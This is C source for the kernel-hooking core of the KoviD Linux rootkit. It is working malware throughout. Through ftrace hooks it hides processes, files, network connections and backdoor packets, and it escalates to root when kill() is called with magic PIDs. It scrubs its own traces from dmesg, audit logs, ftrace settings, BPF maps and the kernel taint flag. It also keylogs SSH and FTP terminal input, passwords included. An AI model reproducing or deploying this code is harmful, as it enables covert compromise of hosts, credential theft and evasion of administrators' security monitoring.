//  KoviD rootkit
// - hash

#include <linux/ftrace.h>
#include <linux/fdtable.h>
#include <linux/version.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/bpf.h>
#include <uapi/linux/bpf.h>
#include <uapi/linux/binfmts.h>
#include <linux/percpu.h>
#include <linux/inet_diag.h>
#include <linux/netlink.h>
#include <linux/syslog.h>

#include "lkm.h"
#include "fs.h"
#include "bpf.h"
#include "tty.h"
#include "log.h"

#pragma GCC optimize("-fno-optimize-sibling-calls")

#define MAX_DEMO_HOOKS 32

sys64 real_m_exit_group;
sys64 real_m_clone;
sys64 real_m_kill;
sys64 real_m_read;
sys64 real_m_bpf;
sys64 real_m_recvmsg;
sys64 real_m_lseek;

#define PT_REGS_PARM1(x) ((x)->di)
#define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
#define PT_REGS_PARM3(x) ((x)->dx)
#define PT_REGS_PARM4(x) ((x)->cx)
#define PT_REGS_PARM5(x) ((x)->r8)
#define PT_REGS_RET(x) ((x)->sp)
#define PT_REGS_FP(x) ((x)->bp)
#define PT_REGS_RC(x) ((x)->ax)
#define PT_REGS_SP(x) ((x)->sp)
#define PT_REGS_IP(x) ((x)->ip)

static DEFINE_SPINLOCK(hide_once_spin);

// task
// ├── hidden No → normal flow
// └── hidden Yes
//     └── Backdoor Yes
//         ├── unhide and kill all back-doors
//     └── Backdoor No
//         ├── unhide task
static asmlinkage long m_exit_group(struct pt_regs *regs)
{
	struct hidden_status status = { 0 };

	// load the status of PID
	if (!kv_find_hidden_pid(&status, current->pid))
		goto resume;

	// back-door?
	if (status.saddr) {
		kv_unhide_task_by_pid_exit_group(current->pid);
	} else {
		// it is regular hidden PID and needs to
		// be shown before exiting
		kv_hide_task_by_pid(current->pid, 0, false);
	}

resume:
	return real_m_exit_group(regs);
}

// task A (parent of B) <- hidden
//     |
//     ├ (clone) --- Task B (child, parent of C) <- hidden by sys_clone if A is hidden
//     |      |
//     |      └ (clone) --- Task C (child) <- hidden by sys_clone if B is hidden
//
// See m_exit_group()
static volatile bool hide_once;
static asmlinkage long m_clone(struct pt_regs *regs)
{
	struct hidden_status status = { .saddr = 0 };
	struct task_struct *task = current;

	// Only proceed if _parent_ IS hidden
	if (!kv_find_hidden_pid(&status, task->parent->pid))
		goto resume;

	// Only proceed if _child_ ISN'T hidden
	status.saddr = 0;
	if (!kv_find_hidden_pid(&status, task->pid)) {
		kv_hide_task_by_pid(task->pid,
				    status.saddr, // inherit parent's status
				    false);
	} else if (hide_once && status.saddr) {
		// allow 1 task to be hidden
		// afterwards, but be careful to not
		// spawn other children, can crash */
		kv_reload_hidden_task(task);
		spin_lock(&hide_once_spin);
		hide_once = false;
		spin_unlock(&hide_once_spin);
	}

resume:
	return real_m_clone(regs);
}

// Handle activate/deactivate /proc/<name>
// Handle privilege escalation
static asmlinkage long m_kill(struct pt_regs *regs)
{
	pid_t pid = (pid_t)PT_REGS_PARM1(regs);
	unsigned long sig = (unsigned long)PT_REGS_PARM2(regs);

	// Open/Close commands interface
	if (31337 == pid && SIGCONT == sig) {
		if (kv_is_proc_interface_loaded())
			kv_remove_proc_interface();
		else
			(void)kv_add_proc_interface();

		// root
	} else if (666 == pid && SIGCONT == sig) {
		struct pt_regs rootregs;
		struct kernel_syscalls *kaddr = kv_kall_load_addr();
		struct cred *new = prepare_creds();

		if (!new || !kaddr || !kaddr->k_sys_setreuid)
			goto resume;

		new->uid.val = new->gid.val = 0;
		new->euid.val = new->egid.val = 0;
		new->suid.val = new->sgid.val = 0;
		new->fsuid.val = new->fsgid.val = 0;

		commit_creds(new);
		rootregs.di = 0;
		rootregs.si = 0;
		kaddr->k_sys_setreuid(&rootregs);
		prinfo("Cool! Now try 'su'\n");

		// The 1 next backdoor task will be hidden
	} else if (171 == pid && SIGCONT == sig) {
		spin_lock(&hide_once_spin);
		hide_once = true;
		spin_unlock(&hide_once_spin);
		prinfo("Cool! Now run your command\n");
	}

resume:
	return real_m_kill(regs);
}

// Given an fd, check if parent
// directory is a match.
static bool is_sys_parent(unsigned int fd)
{
	struct dentry *dentry;
	struct dentry *parent_dentry;
	char *path_buffer, *parent_path;
	bool rv = false;

	struct fd f = fdget(fd);
	if (!f.file)
		goto out;

	dentry = f.file->f_path.dentry;
	parent_dentry = dentry->d_parent;

	path_buffer = (char *)__get_free_page(GFP_KERNEL);
	if (!path_buffer) {
		fdput(f);
		goto out;
	}

	parent_path = d_path(&f.file->f_path, path_buffer, PAGE_SIZE);
	if (!IS_ERR(parent_path)) {
		if (!strncmp(parent_path, "/proc", 5) ||
		    !strncmp(parent_path, "/sys", 4) ||
		    !strncmp(parent_path, "/var/log", 8))
			rv = true;
	}

	fdput(f);
	free_page((unsigned long)path_buffer);

out:
	return rv;
}

static inline bool _ftrace_intercept_init(bool set)
{
	static bool _intercept_init;
	if (set && _intercept_init == false)
		_intercept_init = true;
	return _intercept_init;
}

static char kv_prev_ftrace_enabled[16] = "1\n";
static bool _ftrace_intercept(struct pt_regs *regs)
{
	const char __user *arg;
	struct file *file;
	struct path file_path;
	bool rc = false;

	int fd = PT_REGS_PARM1(regs);
	if (!fd)
		goto out;

	file = fget(fd);
	if (!file)
		goto out;

	// XXX: check this lock against race
	spin_lock(&file->f_lock);
	file_path = file->f_path;
	spin_unlock(&file->f_lock);
	fput(file);

	if (file_path.dentry && file_path.dentry->d_name.name) {
		if (strstr(file_path.dentry->d_name.name, "ftrace_enabled") &&
		    _ftrace_intercept_init(false)) {
			char current_value[16 + 1] = { 0 };
			char output[] = "1\n";
			size_t output_size;

			arg = (const char __user *)PT_REGS_PARM2(regs);
			if (copy_from_user(current_value, (void *)arg, 16))
				goto out;

			current_value[sizeof(current_value) - 1] = '\0';
			strncpy(output, kv_prev_ftrace_enabled, sizeof(output));
			output_size = sizeof(output) - 1;

			if (!copy_to_user((void *)arg, output, output_size))
				rc = true;
		}
	}
out:
	return rc;
}

static asmlinkage long m_read(struct pt_regs *regs)
{
	char *buf = NULL;
	const char __user *arg;
	size_t size;
	long rv;
	struct fs_file_node *fs = NULL;
	bool is_dmesg = false;

	// call the real thing first
	rv = real_m_read(regs);

	if (_ftrace_intercept(regs))
		goto leave;

	fs = fs_get_file_node(current);
	if (!fs || !fs->filename)
		goto leave;

	// ugly hack special case :(
	is_dmesg = !strcmp(fs->filename, "dmesg");

	// Apply only for a few commands
	if ((!is_dmesg) && (strcmp(fs->filename, "cat") != 0) &&
	    (strcmp(fs->filename, "tail") != 0) &&
	    (strcmp(fs->filename, "grep") != 0))
		goto leave;

	size = PT_REGS_PARM3(regs);
	if (!(buf = (char *)kzalloc(size + 1, GFP_KERNEL)))
		goto leave;

	arg = (const char __user *)PT_REGS_PARM2(regs);
	if (!copy_from_user((void *)buf, (void *)arg, size)) {
		int dest = ((strstr(buf, MODNAME) || strstr(buf, "kovid") ||
			     strstr(buf, "journald")));
		if (!dest)
			goto leave;

		// if KoviD is here, skip
		if (is_dmesg ||
		    is_sys_parent((unsigned int)PT_REGS_PARM1(regs))) {
			// We'll add a new line
			// without any timestamp
			const char *obuf = "\n";
			size_t olen = strlen(obuf);

			if (olen > rv)
				olen = rv;

			if (copy_to_user((char __user *)arg, obuf, olen))
				goto leave;

			if (olen < rv) {
				if (copy_to_user((char __user *)arg + olen,
						 "\0", 1))
					goto leave;
			}
			rv = olen;
		}
	}
leave:
	kv_mem_free(&fs, &buf);
	return rv;
}

// Stolen static/private helpers
// from the kernel
static inline void *u64_to_ptr(__u64 ptr)
{
	return (void *)(unsigned long)ptr;
}

static inline bool stack_map_use_build_id(struct bpf_map *map)
{
	return (map->map_flags & BPF_F_STACK_BUILD_ID);
}

static inline int stack_map_data_size(struct bpf_map *map)
{
	return stack_map_use_build_id(map) ? sizeof(struct bpf_stack_build_id) :
					     sizeof(u64);
}

static u32 bpf_map_value_size(struct bpf_map *map)
{
	if (map->map_type == BPF_MAP_TYPE_PERCPU_HASH ||
	    map->map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||
	    map->map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||
	    map->map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)
		return round_up(map->value_size, 8) * num_possible_cpus();
	else if (IS_FD_MAP(map))
		return sizeof(u32);
	else
		return map->value_size;
}

static unsigned long _get_sys_addr(unsigned long addr)
{
	struct sys_addr_list *sl, *sl_safe;
	list_for_each_entry_safe (sl, sl_safe, &sys_addr, list) {
		if (sl->addr == addr) {
			prinfo("bpf match: %lx -> %lx\n", sl->addr, addr);
			return sl->addr;
		}
	}
	return 0UL;
}

static asmlinkage long m_bpf(struct pt_regs *regs)
{
	long ret = 0;
	union bpf_attr *attr = NULL;
	union bpf_attr __user *uattr;
	struct kernel_syscalls *ks;
	void *key = NULL, *value = NULL;
	unsigned long size = (unsigned int)PT_REGS_PARM3(regs);

	// Call original first this time
	ret = real_m_bpf(regs);
	if (ret < 0)
		goto leave;

	if (!(attr = (union bpf_attr *)kmalloc(size, GFP_KERNEL)))
		goto leave;

	uattr = (union bpf_attr __user *)PT_REGS_PARM2(regs);
	if (copy_from_user(attr, uattr, size))
		goto leave;

	ks = kv_kall_load_addr();
	if (ks && ks->k_bpf_map_get) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
		struct bpf_map *map = ks->k_bpf_map_get(attr->map_fd);
#else
#warning "Using old __bpf_map_get"
		struct file *file = fget(attr->map_fd);
		struct fd f = { .file = file, .flags = 0 };
		struct bpf_map *map = ks->k_bpf_map_get(f);
#endif
		struct bpf_stack_map *smap =
			container_of(map, struct bpf_stack_map, map);

		if (!smap) {
			prerr("smap error\n");
			goto leave;
		}

		// To extract the value, we must traverse the stack:
		// sys_bpf -> __sys_bpf -> map_lookup_elem
		// In simpler terms, we need to recover the user pointer
		// that is about to be returned to userspace. We'll then
		// read, modify, and write it back. The goal is to nullify
		// it if there's a match, ensuring it doesn't get used.
		if (attr->map_type == BPF_MAP_TYPE_PERF_EVENT_ARRAY) {
			u32 id;
			void __user *ukey = u64_to_user_ptr(attr->key);
			struct stack_map_bucket *bucket;
			u32 trace_len, value_size;
			unsigned long s;

			key = kmalloc(map->key_size, GFP_KERNEL);
			if (!key)
				goto leave;

			if (copy_from_user(key, ukey, map->key_size))
				goto leave;

			id = *(u32 *)key;
			if (unlikely(id >= smap->n_buckets)) {
				prerr("id error: id=%d key=%p\n", id, key);
				goto leave;
			}

			bucket = xchg(&smap->buckets[id], NULL);
			if (!bucket)
				goto leave;

			value_size = bpf_map_value_size(map);
			value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);
			if (!value)
				goto leave;

			trace_len = bucket->nr * stack_map_data_size(map);
			memcpy(value, bucket->data, trace_len);
			memset((char *)value + trace_len, 0,
			       value_size - trace_len);

			// Now we check if value (stored syscall address)
			// is one of us
			s = _get_sys_addr(*(unsigned long *)value &
					  0xfffffffffffffff0);
			if (s != 0UL) {
				void *v = kmalloc(value_size, GFP_KERNEL);
				if (v) {
					// fetch userspace buffer and clear
					void __user *uvalue =
						u64_to_user_ptr(attr->value);
					memset(v, 0, value_size);

					// Send the new empty value back to the userspace.
					// and pretend map value hasn't spin lock (-EINVAL),
					if (!copy_to_user((void *)uvalue,
							  (void *)v,
							  value_size))
						ret = -EINVAL;
					else
						prerr("Failed to copy bpf uvalue\n");

					kv_mem_free(&v);
				}
			}
		}
	}

leave:
	kv_mem_free(&key, &value, &attr);
	return ret;
}

static asmlinkage long m_recvmsg(struct pt_regs *regs)
{
	size_t remaining_len;
	long ret;
	struct iovec iov_kernel;
	struct user_msghdr msg_kernel;
	struct user_msghdr __user *umsg;
	struct nlmsghdr *nlh;
	void *kbuf;
	char *stream;

	ret = real_m_recvmsg(regs);

	umsg = (struct user_msghdr __user *)PT_REGS_PARM2(regs);
	if (!umsg || !access_ok(umsg, sizeof(*umsg))) {
		prerr("Invalid user-space pointer for msghdr\n");
		return ret;
	}

	// copy user-space msghdr to kernel-space
	if (copy_from_user(&msg_kernel, umsg, sizeof(msg_kernel))) {
		prerr("Failed to copy msghdr from user space\n");
		return ret;
	}

	if (!msg_kernel.msg_iov ||
	    !access_ok(msg_kernel.msg_iov, sizeof(struct iovec))) {
		prerr("Invalid or inaccessible iovec pointer\n");
		return ret;
	}

	// __user *msg_iov
	if (copy_from_user(&iov_kernel, msg_kernel.msg_iov,
			   sizeof(iov_kernel))) {
		prerr("Failed to copy iovec from user space\n");
		return ret;
	}

	// iov_base can be NULL
	if (!iov_kernel.iov_base ||
	    !access_ok(iov_kernel.iov_base, iov_kernel.iov_len)) {
		return ret;
	}

	kbuf = kmalloc(iov_kernel.iov_len, GFP_KERNEL);
	if (!kbuf) {
		prerr("Failed to allocate kernel buffer\n");
		return ret;
	}

	// __user *iov_base
	if (copy_from_user(kbuf, iov_kernel.iov_base, iov_kernel.iov_len)) {
		prerr("Failed to copy data from user space\n");
		goto leave;
	}

	nlh = (struct nlmsghdr *)kbuf;
	remaining_len = iov_kernel.iov_len;
	stream = (char *)kbuf;

	while (remaining_len >= sizeof(struct nlmsghdr) &&
	       NLMSG_OK(nlh, remaining_len)) {
		struct inet_diag_msg *idm = NLMSG_DATA(nlh);
		int dport = ntohs(idm->id.idiag_dport);

		if (dport > 0 &&
		    kv_bd_search_iph_source_port(idm->id.idiag_dport)) {
			int offset = NLMSG_ALIGN(nlh->nlmsg_len);

			prinfo("netlink: removing message with destination port %d\n",
			       dport);

			if (remaining_len > offset) {
				memmove(nlh, (char *)nlh + offset,
					remaining_len - offset);
				// zero remaining of buffer
				memset((char *)nlh + (remaining_len - offset),
				       0, offset);
			}

			// update remaining length and ret
			remaining_len -= offset;
			ret -= offset;

			// do not increment nlh; stay at the same position
			continue;
		}

		/** shift to next msg */
		nlh = NLMSG_NEXT(nlh, remaining_len);
	}

	// at this point, the message may have been modified.
	// If the checks below fail, return failure.
	// Alternatively, you could return the original 'ret' value,
	// but that would risk exposing the back-door

	// validate remaining length
	if (remaining_len > iov_kernel.iov_len) {
		prerr("netlink: buffer length mismatch! remaining_len = %zu, expected <= %zu\n",
		      remaining_len, iov_kernel.iov_len);
		goto err;
	}

	// copy the modified buffer back to userspace
	if (copy_to_user(iov_kernel.iov_base, kbuf, iov_kernel.iov_len)) {
		prerr("netlink: failed to copy modified buffer back to user space\n");
		goto err;
	}

	// all good?
	goto leave;

err:
	ret = -EFAULT;

leave:
	kfree(kbuf);
	return ret;
}

static asmlinkage long m_lseek(struct pt_regs *regs)
{
	int fd = (int)PT_REGS_PARM1(regs);
	unsigned long this_ino;
	struct dentry *dentry;
	char *p;
	char name[NAME_MAX + 1] = { 0 };

	struct file *file = fget(fd);
	if (!file)
		goto resume;

	this_ino = file->f_inode->i_ino;
	dentry = file->f_path.dentry;
	p = dentry_path_raw(dentry, name, NAME_MAX);

	// Check PROCNAME partial match; otherwise don't proceed further.
	if (NULL != p && strstr(p, PROCNAME)) {
		struct kstat stat;
		struct path path;
		if (fs_kern_path(PROCNAME_FULL, &path) &&
		    fs_file_stat(&path, &stat)) {
			if (stat.ino == this_ino) {
				fput(file);
				// No lseek for PROCNAME
				goto leave;
			}
		}
	}

	fput(file);
resume:
	return real_m_lseek(regs);

leave:
	return -ENOENT;
}

struct tcpudpdata {
	struct seq_file *seq;
	void *v;
};
static bool _find_tcp4udp4_match_cb(struct task_struct *task, void *t)
{
	struct tcpudpdata *priv = (struct tcpudpdata *)t;

	if (task && priv) {
		int idx = 0;
		struct fdtable *fdt;
		struct files_struct *files;
		struct sock *s = (struct sock *)priv->v;

		if (!s || !s->sk_socket || !s->sk_socket->file)
			goto not_found;

		files = task->files;

		spin_lock(&files->file_lock);
		for (fdt = files_fdtable(files); idx < fdt->max_fds; ++idx) {
			if (!fdt->fd[idx])
				continue;

			if (s->sk_socket->file->f_inode ==
			    fdt->fd[idx]->f_inode) {
				// found, notify
				spin_unlock(&files->file_lock);
				goto found;
			}
		}
		spin_unlock(&files->file_lock);
	}
not_found:
	return false;
found:
	return true;
}

static int (*real_m_tcp4_seq_show)(struct seq_file *seq, void *v);
static int m_tcp4_seq_show(struct seq_file *seq, void *v)
{
	if (v != SEQ_START_TOKEN) {
		struct tcpudpdata t = { .seq = seq, .v = v };
		if (kv_for_each_hidden_backdoor_task(_find_tcp4udp4_match_cb,
						     (void *)&t)) {
			prinfo("Got tcp4 task from callback\n");
			return 0;
		}
	}

	return real_m_tcp4_seq_show(seq, v);
}

static int (*real_m_udp4_seq_show)(struct seq_file *seq, void *v);
static int m_udp4_seq_show(struct seq_file *seq, void *v)
{
	if (v != SEQ_START_TOKEN) {
		struct tcpudpdata t = { .seq = seq, .v = v };
		if (kv_for_each_hidden_backdoor_task(_find_tcp4udp4_match_cb,
						     (void *)&t)) {
			prinfo("Got udp4 task from callback\n");
			return 0;
		}
	}

	return real_m_tcp4_seq_show(seq, v);
}

static int (*real_m_tcp6_seq_show)(struct seq_file *seq, void *v);
static int m_tcp6_seq_show(struct seq_file *seq, void *v)
{
	if (v != SEQ_START_TOKEN) {
		struct tcpudpdata t = { .seq = seq, .v = v };
		if (kv_for_each_hidden_backdoor_task(_find_tcp4udp4_match_cb,
						     (void *)&t)) {
			prinfo("Got tcp6 task from callback\n");
			return 0;
		}
	}

	return real_m_tcp6_seq_show(seq, v);
}

static int (*real_m_udp6_seq_show)(struct seq_file *seq, void *v);
static int m_udp6_seq_show(struct seq_file *seq, void *v)
{
	if (v != SEQ_START_TOKEN) {
		struct tcpudpdata t = { .seq = seq, .v = v };
		if (kv_for_each_hidden_backdoor_task(_find_tcp4udp4_match_cb,
						     (void *)&t)) {
			prinfo("Got udp6 task from callback\n");
			return 0;
		}
	}

	return real_m_tcp6_seq_show(seq, v);
}

static bool _find_packet_rcv_iph_match_cb(__be32 addr, void *t)
{
	struct sk_buff *skb = (struct sk_buff *)t;
	struct iphdr *iph = (struct iphdr *)skb_network_header(skb);

	if (iph->saddr == addr || iph->daddr == addr) {
		return true;
	}
	return false;
}

// packet sniffers
static int (*real_packet_rcv)(struct sk_buff *, struct net_device *,
			      struct packet_type *, struct net_device *);
static int m_packet_rcv(struct sk_buff *skb, struct net_device *dev,
			struct packet_type *pt, struct net_device *orig_dev)
{
	if (skb->protocol == htons(ETH_P_IP)) {
		struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
		if (kv_for_each_hidden_backdoor_data(
			    _find_packet_rcv_iph_match_cb, skb))
			return 0;
		else if (kv_bd_search_iph_source(iph->saddr))
			return 0;
		else {
			struct tcphdr *tcp =
				(struct tcphdr *)skb_transport_header(skb);
			if (kv_check_bdkey(tcp, skb))
				return 0;
		}
	}

	return real_packet_rcv(skb, dev, pt, orig_dev);
}

static int (*real_tpacket_rcv)(struct sk_buff *, struct net_device *,
			       struct packet_type *, struct net_device *);
static int m_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
			 struct packet_type *pt, struct net_device *orig_dev)
{
	if (skb->protocol == htons(ETH_P_IP)) {
		struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
		if (kv_for_each_hidden_backdoor_data(
			    _find_packet_rcv_iph_match_cb, skb))
			return 0;
		else if (kv_bd_search_iph_source(iph->saddr))
			return 0;
		else {
			struct tcphdr *tcp =
				(struct tcphdr *)skb_transport_header(skb);
			if (kv_check_bdkey(tcp, skb))
				return 0;
		}
	}

	return real_tpacket_rcv(skb, dev, pt, orig_dev);
}

// Hide CPU usage of any hidden task by
// not counting ticks
// if they come from hidden tasks
static void (*real_account_process_tick)(struct task_struct *, int);
static void m_account_process_tick(struct task_struct *p, int user_tick)
{
	bool found = kv_find_hidden_task(p);
	real_account_process_tick(p, found ? 0 : user_tick);
}

// And do the same here for cputime
static void (*real_account_system_time)(struct task_struct *, int, u64);
static void m_account_system_time(struct task_struct *p, int hardirq_offset,
				  u64 cputime)
{
	bool found = kv_find_hidden_task(p);
	real_account_system_time(p, hardirq_offset, found ? 0 : cputime);
}

static struct audit_buffer *(*real_audit_log_start)(struct audit_context *,
						    gfp_t, int);
static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
					      gfp_t gfp_mask, int type)
{
	const struct cred *c = current->real_cred;

	// This KauditD log is triggered during specific operations after privilege escalation.
	// Legitimate root users may not follow this code path.
	if (!c->uid.val && !c->gid.val && !c->suid.val && !c->sgid.val &&
	    !c->euid.val && !c->egid.val && !c->fsuid.val && !c->fsgid.val) {
		return NULL;
	}
	return real_audit_log_start(ctx, gfp_mask, type);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
static bool (*real_filldir)(struct dir_context *, const char *, int, loff_t,
			    u64, unsigned int);
static bool m_filldir(struct dir_context *ctx, const char *name, int namlen,
		      loff_t offset, u64 ino, unsigned int d_type)
#else
static int (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64,
			   unsigned int);
static int m_filldir(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type)
#endif
{
	// For certain hidden files we don't have inode number initially,
	// when hidden with "hide-file-anywhere" but it is available here
	// and it is updated below, if needed.
	// Also for files hidden anywhere same file can live
	// in multiple directories, thus inode number may
	// be updated to the current directory being listed
	if (fs_search_name(name, ino))

	//For kernels v6.1 and later, return 'true' to
	// * stop iteration instead of '0'.
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
		return true;
#else
		return 0;
#endif
	return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
static bool (*real_filldir64)(struct dir_context *, const char *, int, loff_t,
			      u64, unsigned int);
static bool m_filldir64(struct dir_context *ctx, const char *name, int namlen,
			loff_t offset, u64 ino, unsigned int d_type)
#else
static int (*real_filldir64)(struct dir_context *, const char *, int, loff_t,
			     u64, unsigned int);
static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,
		       loff_t offset, u64 ino, unsigned int d_type)
#endif
{
	if (fs_search_name(name, ino))
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
		return true;
#else
		return 0;
#endif
	return real_filldir64(ctx, name, namlen, offset, ino, d_type);
}

static LIST_HEAD(keylog_node);
static struct tty_ctx tty_sys_ctx = {
	.head = &keylog_node,
	.fp = NULL,
};

static void _keylog_cleanup(void)
{
	kv_tty_close(&tty_sys_ctx);
	memset(&tty_sys_ctx, 0, sizeof(struct tty_ctx));
	fs_file_rm(sys_get_ttyfile());
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 12, 0)
static ssize_t (*real_tty_read)(struct file *, char __user *, size_t, loff_t *);
static ssize_t m_tty_read(struct file *file, char __user *buf, size_t count,
			  loff_t *ppos)
#else
static ssize_t (*real_tty_read)(struct kiocb *iocb, struct iov_iter *to);
static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
#endif
{
	char *ttybuf = NULL;
	struct fs_file_node *fs = NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 12, 0)
	ssize_t rv = real_tty_read(file, buf, count, ppos);
#else
	ssize_t rv = real_tty_read(iocb, to);
#endif
	if (rv <= 0)
		goto leave;

	ttybuf = kzalloc(rv + 1, GFP_KERNEL);
	if (ttybuf) {
		char byte;
		uid_t uid;
		enum { APP_SSH = 1, APP_FTP };
		int app_flag = 0, flags = R_NONE;

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 12, 0)
		if (copy_from_user(ttybuf, buf, rv))
			goto leave;
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
		const struct iovec *iov = iter_iov(to);
		if (!iov || !iov->iov_base)
			goto leave;

		if (copy_from_user(ttybuf, iov->iov_base, rv))
			goto leave;
#else
		if (!to->iov || !to->iov->iov_base)
			goto leave;

		if (copy_from_user(ttybuf, to->iov->iov_base, rv))
			goto leave;
#endif

		fs = fs_get_file_node(current);
		if (!fs)
			goto leave;

		if (!strncmp(fs->filename, "ssh", 3))
			app_flag |= APP_SSH;
		else if (!strncmp(fs->filename, "netkit", 6))
			app_flag |= APP_FTP;

		byte = ttybuf[0];
		uid = current->cred->uid.val;

		flags |= (byte >= 32 && byte < 127) ? R_RANGE : flags;
		flags |= (byte == '\r') ? R_RETURN : flags;
		flags |= (byte == '\n') ? R_NEWLINE : flags;

		// To handle SSH session data, it typically
		// comes one byte at a time, but there are instances when it comes
		// as a multi-byte stream, for example, during password input.
		if ((app_flag & APP_FTP) && rv > 1) {
			ttybuf[strcspn(ttybuf, "\r")] = '\0';
			kv_tty_write(&tty_sys_ctx, uid, ttybuf, sizeof(ttybuf));
		} else if (app_flag & APP_SSH &&
			   (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
			kv_key_update(&tty_sys_ctx, uid, byte, flags);
		}
	}
leave:
	kv_mem_free(&ttybuf, &fs);
	return rv;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 8, 0)
static int (*real_proc_dointvec)(struct ctl_table *, int, void __user *,
				 size_t *, loff_t *);
static int m_proc_dointvec(struct ctl_table *table, int write,
			   void __user *buffer, size_t *lenp, loff_t *ppos)
#else
static int (*real_proc_dointvec)(struct ctl_table *, int, void *, size_t *,
				 loff_t *);
static int m_proc_dointvec(struct ctl_table *table, int write, void *buffer,
			   size_t *lenp, loff_t *ppos)
#endif
{
	int rc = real_proc_dointvec(table, write, buffer, lenp, ppos);
	if (write) {
		int val = *(int *)(table->data);

		(void)_ftrace_intercept_init(true);

		if (val == 0)
			*(int *)(table->data) = 1;

		snprintf(kv_prev_ftrace_enabled, sizeof(kv_prev_ftrace_enabled),
			 "%d\n", val);
	}
	return rc;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
#define ftrace_regs pt_regs

static __always_inline struct pt_regs *
ftrace_get_regs(struct ftrace_regs *fregs)
{
	return fregs;
}
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
#define __MAXLEN 256
static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *,
			      u32);
static long m_vfs_statx(int dfd, const char __user *filename, int flags,
			struct kstat *stat, u32 request_mask)
{
#else
static long (*real_vfs_statx)(int, struct filename *, int, struct kstat *, u32);
static long m_vfs_statx(int dfd, struct filename *filename, int flags,
			struct kstat *stat, u32 request_mask)
{
#endif
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
	char *target = kzalloc(__MAXLEN, GFP_KERNEL);
#else
	const char *target = filename ? filename->name : "";
#endif

	// call original first, I want stat
	long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);

	//  Return not found to userspace if target is present (file,dir),
	//  otherwise count the number of hidden hard-links
	//      and use it to decrement "Links:"
	//  Check: if it can be optimized
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
	if (target != NULL &&
	    !copy_from_user((void *)target, filename, __MAXLEN - 1)) {
#endif
		const char *name = fs_get_basename(target);
		if (fs_search_name(name, stat->ino)) {
			rv = -ENOENT;
			goto leave;
		}

		// nothing found for this entry.
		// Tamper 'nlink', if needed.
		if (S_ISDIR(stat->mode)) {
			int count = fs_is_dir_inode_hidden(stat->ino);
			if (count > 0) {
				prinfo("%s: file match ino=%llu nlink=%d count=%d\n",
				       __func__, stat->ino, stat->nlink, count);
				stat->nlink -= count;
			}
		}
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
	}
#endif

leave:
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 18, 0)
	if (target != NULL) {
		kfree(target);
	}
#endif
	return rv;
}

static unsigned long _load_syscall_variant(struct kernel_syscalls *ks,
					   const char *str)
{
	unsigned long rv = 0UL;
	if (!ks || !ks->k_kallsyms_lookup_name) {
		prerr("unresolved: kallsyms_lookup_name\n");
		return 0L;
	}

	if (!str) {
		prerr("invalid argument\n");
		return 0L;
	}

	rv = ks->k_kallsyms_lookup_name(str);
	if (rv) {
		struct sys_addr_list *sl;
		sl = kcalloc(1, sizeof(struct sys_addr_list), GFP_KERNEL);
		if (sl) {
			sl->addr = rv;
			prinfo("add sysaddr: %lx\n", sl->addr);
			list_add_tail(&sl->list, &sys_addr);
		}
	}

	return rv;
}

struct ftrace_hook {
	// Must not change declaration
	// ordering for the following members.
	// @See ft_hooks
	const char *name;
	void *function;
	void *original;

	// Syscall will incur in extra checks
	bool syscall;

	unsigned long address;
	struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	struct kernel_syscalls *ksp = kv_kall_load_addr();
	if (!ksp || !ksp->k_kallsyms_lookup_name) {
		prerr("unresolved: kallsyms_lookup_name\n");
		return -ENOENT;
	}

	if (!hook->syscall)
		hook->address = ksp->k_kallsyms_lookup_name(hook->name);
	else
		hook->address = _load_syscall_variant(ksp, hook->name);

	if (!hook->address) {
		prerr("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

	*((unsigned long *)hook->original) = hook->address;

	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
				    struct ftrace_ops *ops,
				    struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

	if (!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
}

int kv_reset_tainted(unsigned long *tainted_ptr)
{
	return test_and_clear_bit(TAINT_UNSIGNED_MODULE, tainted_ptr);
}

#ifdef __x86_64__
#define _sys_arch(s) "__x64_" s
#else
#define _sys_arch(s) s
#endif

